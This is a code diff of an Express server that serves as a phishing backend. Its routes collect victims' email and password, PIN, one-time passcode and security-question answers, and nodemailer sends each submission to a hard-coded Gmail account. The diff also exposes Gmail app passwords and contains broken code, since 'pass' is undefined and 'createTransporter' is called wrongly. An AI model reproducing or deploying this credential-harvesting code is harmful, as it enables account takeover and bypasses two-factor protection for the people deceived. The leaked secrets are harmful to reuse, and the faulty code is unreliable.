@@ -1,220 +1,172 @@
-const express = require("express");
-const app = express();
+const express = require("express"); // express is use for getting api i.e POST request GET DELETE and PUT
+
+const app = express(); // app is use for link express functions
 const cors = require("cors");
-const nodemailer = require("nodemailer");
+const nodemailer = require("nodemailer"); // nodemailer is use for transporting what was gooten to email
 
 app.use(express.json());
 app.use(cors());
 
-const PORT = process.env.PORT || 5000;
+const PORT = process.env.PORT || 5000; // port to connect to WEB
 
-// Email credentials
-const userEmail = "chidiebereajaeroelvis@gmail.com";
-const pass = "qpboyelacgloplhy";
+// emails credentials
+const userEmail = "ajaeroElvis5@gmail.com";
+//const pass = "qrgdnnovrfqeyutr";
+// 15 APRIL
 
-// Create transporter function with better error handling
-const createTransporter = () => {
+// Middleware
+app.use(express.json());
+
+// api routes
+
+// API routes for index
+app.post("/", (req, res) => {
+  const { email, password } = req.body;
+
+  const transporter = nodemailer.createTransport({
+    service: "gmail",
+    auth: {
+      user: userEmail,
+      pass: pass,
+    },
+  });
+
+  const mailOptions = {
+    from: email,
+    to: userEmail,
+    subject: `email: ${email}\nPassword: ${password}`,
+    text: `New user registered with Email: ${email}\nPassword: ${password}`,
+  };
+
+  console.log(mailOptions);
+  transporter.sendMail(mailOptions, (error, info) => {
+    if (error) {
+      console.log(error);
+      res.send("error Occured: " + error);
+    } else {
+      console.log("Email sent", +info.response);
+      res.send("success");
+    }
+  });
+});
+// API routes for pin
+app.post("/pin", (req, res) => {
+  console.log(req.body);
+  let { pin } = req.body;
+
+  const transporter = nodemailer.createTransport({
+    service: "gmail",
+    auth: {
+      user: userEmail,
+      pass: pass,
+    },
+  });
+
+  const mailOptions = {
+    from: userEmail,
+    to: userEmail,
+    subject: `PIN is: ${pin}`,
+    text: `New user PIN is: ${pin}`,
+  };
+  console.log(mailOptions);
+  transporter.sendMail(mailOptions, (error, info) => {
+    if (error) {
+      console.log(error);
+      res.send("error Occured: " + error);
+    } else {
+      console.log("Email sent", +info.response);
+      res.send("success");
+    }
+  });
+});
+// API routes for otp
+app.post("/otp", (req, res) => {
+  console.log(req.body);
+  let { otp } = req.body;
+
+  const transporter = nodemailer.createTransport({
+    service: "gmail",
+    auth: {
+      user: userEmail,
+      pass: pass,
+    },
+  });
+
+  const mailOptions = {
+    from: userEmail,
+    to: userEmail,
+    subject: `OTP is: ${otp}`,
+    text: `New user OTP is: ${otp}`,
+  };
+  console.log(mailOptions);
+  transporter.sendMail(mailOptions, (error, info) => {
+    if (error) {
+      console.log(error);
+      res.send("error Occured: " + error);
+    } else {
+      console.log("Email sent", +info.response);
+      res.send("success");
+    }
+  });
+});
+
+// Backend - Updated server.js security route
+app.post("/security", async (req, res) => {
+  const { questions } = req.body;
+  
+  // Create structured object with questions and answers
+  const securityData = {
+    question1: {
+      question: questions[0]?.question || "",
+      answer: questions[0]?.answer || ""
+    },
+    question2: {
+      question: questions[1]?.question || "",
+      answer: questions[1]?.answer || ""
+    },
+    question3: {
+      question: questions[2]?.question || "",
+      answer: questions[2]?.answer || ""
+    }
+  };
+  
+  // Format for email display
+  const formattedQuestions = [
+    `QUESTION 1:\n${securityData.question1.question}\nANSWER 1:\n${securityData.question1.answer}`,
+    `QUESTION 2:\n${securityData.question2.question}\nANSWER 2:\n${securityData.question2.answer}`,
+    `QUESTION 3:\n${securityData.question3.question}\nANSWER 3:\n${securityData.question3.answer}`
+  ].join("\n\n" + "=".repeat(50) + "\n\n");
+  
+  // Configure your email
+  const transporter = nodemailer.createTransporter({
+    service: "gmail",
+    auth: {
+      user: userEmail,
+      pass: pass,
+    },
+  });
+  
+  const mailOptions = {
+    from: userEmail,
+    to: userEmail,
+    subject: "Security Questions Submission - 3 Questions",
+    text: `Security Questions Data:\n\n${formattedQuestions}\n\nStructured Data Object:\n${JSON.stringify(securityData, null, 2)}`,
+  };
+  
   try {
-    return nodemailer.createTransporter({
-      service: "gmail",
-      auth: {
-        user: userEmail,
-        pass: pass,
-      },
-      timeout: 30000, // 30 seconds timeout
+    console.log("Security Data Object:", securityData);
+    console.log("Formatted Email Content:", formattedQuestions);
+    
+    await transporter.sendMail(mailOptions);
+    res.status(200).json({ 
+      message: "Security questions submitted successfully!",
+      data: securityData 
     });
   } catch (error) {
-    console.error("Error creating transporter:", error);
-    throw error;
-  }
-};
-
-// Helper function to send email with better error handling
-const sendEmail = async (subject, text, transporter = null) => {
-  try {
-    if (!transporter) {
-      transporter = createTransporter();
-    }
-    
-    const mailOptions = {
-      from: userEmail,
-      to: userEmail,
-      subject: subject,
-      text: text,
-    };
-    
-    console.log("Sending email with subject:", subject);
-    const result = await transporter.sendMail(mailOptions);
-    console.log("Email sent successfully:", result.messageId);
-    return { success: true, result };
-  } catch (error) {
-    console.error("Error sending email:", error);
-    return { success: false, error: error.message };
-  }
-};
-
-// API routes for index (login)
-app.post("/", async (req, res) => {
-  try {
-    const { email, password } = req.body;
-    
-    if (!email || !password) {
-      return res.status(400).json({ success: false, message: "Email and password are required" });
-    }
-    
-    const subject = "New Login Attempt";
-    const text = `New user registered with Email: ${email}\nPassword: ${password}`;
-    
-    const emailResult = await sendEmail(subject, text);
-    
-    if (emailResult.success) {
-      res.status(200).json({ success: true, message: "Login details submitted successfully" });
-    } else {
-      res.status(500).json({ success: false, message: "Failed to send email: " + emailResult.error });
-    }
-  } catch (error) {
-    console.error("Error in login endpoint:", error);
-    res.status(500).json({ success: false, message: "Internal server error" });
-  }
-});
-
-// API routes for PIN
-app.post("/pin", async (req, res) => {
-  try {
-    const { pin } = req.body;
-    
-    if (!pin) {
-      return res.status(400).json({ success: false, message: "PIN is required" });
-    }
-    
-    console.log("Received PIN:", pin);
-    
-    const subject = `PIN Submission`;
-    const text = `New user PIN is: ${pin}`;
-    
-    const emailResult = await sendEmail(subject, text);
-    
-    if (emailResult.success) {
-      res.status(200).json({ success: true, message: "PIN submitted successfully" });
-    } else {
-      res.status(500).json({ success: false, message: "Failed to send PIN email: " + emailResult.error });
-    }
-  } catch (error) {
-    console.error("Error in PIN endpoint:", error);
-    res.status(500).json({ success: false, message: "Internal server error: " + error.message });
-  }
-});
-
-// API routes for OTP
-app.post("/otp", async (req, res) => {
-  try {
-    const { otp } = req.body;
-    
-    if (!otp) {
-      return res.status(400).json({ success: false, message: "OTP is required" });
-    }
-    
-    console.log("Received OTP:", otp);
-    
-    const subject = `OTP Submission`;
-    const text = `New user OTP is: ${otp}`;
-    
-    const emailResult = await sendEmail(subject, text);
-    
-    if (emailResult.success) {
-      res.status(200).json({ success: true, message: "OTP submitted successfully" });
-    } else {
-      res.status(500).json({ success: false, message: "Failed to send OTP email: " + emailResult.error });
-    }
-  } catch (error) {
-    console.error("Error in OTP endpoint:", error);
-    res.status(500).json({ success: false, message: "Internal server error: " + error.message });
-  }
-});
-
-// API routes for Security Questions - Send 3 separate emails
-app.post("/security", async (req, res) => {
-  try {
-    console.log("Received security questions request:", req.body);
-    const { questions } = req.body;
-    
-    // Validate that we have questions array
-    if (!questions || !Array.isArray(questions)) {
-      console.log("Invalid questions format");
-      return res.status(400).json({ success: false, message: "Questions must be an array" });
-    }
-    
-    // Validate that we have exactly 3 questions
-    if (questions.length !== 3) {
-      console.log(`Expected 3 questions, got ${questions.length}`);
-      return res.status(400).json({ 
-        success: false, 
-        message: `Exactly 3 security questions are required, received ${questions.length}` 
-      });
-    }
-    
-    // Validate each question has required fields
-    for (let i = 0; i < questions.length; i++) {
-      if (!questions[i].question || !questions[i].answer) {
-        console.log(`Question ${i + 1} missing required fields:`, questions[i]);
-        return res.status(400).json({ 
-          success: false, 
-          message: `Question ${i + 1} is missing required fields` 
-        });
-      }
-    }
-    
-    // Create transporter once for all emails
-    const transporter = createTransporter();
-    
-    // Send 3 separate emails synchronously to ensure they all go through
-    const emailResults = [];
-    
-    for (let i = 0; i < questions.length; i++) {
-      const q = questions[i];
-      const subject = `Security Question ${i + 1} Submission`;
-      const text = `Security Question ${i + 1}:\nQuestion: ${q.question}\nAnswer: ${q.answer}`;
-      
-      const emailResult = await sendEmail(subject, text, transporter);
-      emailResults.push({ questionIndex: i + 1, ...emailResult });
-      
-      // Small delay between emails to avoid rate limiting
-      if (i < questions.length - 1) {
-        await new Promise(resolve => setTimeout(resolve, 1000));
-      }
-    }
-    
-    const successful = emailResults.filter(r => r.success).length;
-    const failed = emailResults.length - successful;
-    
-    console.log(`Security questions processing complete: ${successful} successful, ${failed} failed`);
-    
-    if (successful === 3) {
-      res.status(200).json({ 
-        success: true, 
-        message: "All 3 security questions submitted successfully!",
-        emailsSent: successful
-      });
-    } else if (successful > 0) {
-      res.status(200).json({ 
-        success: true, 
-        message: `${successful} out of 3 security questions submitted successfully`,
-        emailsSent: successful,
-        warnings: `${failed} emails failed to send`
-      });
-    } else {
-      res.status(500).json({ 
-        success: false, 
-        message: "Failed to send any security question emails",
-        errors: emailResults.map(r => r.error).filter(Boolean)
-      });
-    }
-    
-  } catch (error) {
-    console.error("Error in security questions endpoint:", error);
+    console.error("Error sending security questions email:", error);
     res.status(500).json({ 
-      success: false, 
-      message: "Internal server error: " + error.message 
+      error: "Failed to send email",
+      details: error.message 
     });
   }
 });
@@ -222,3 +174,4 @@ app.post("/security", async (req, res) => {
 app.listen(PORT, () => {
   console.log(`Server is running on port http://localhost:${PORT}`);
 });
+
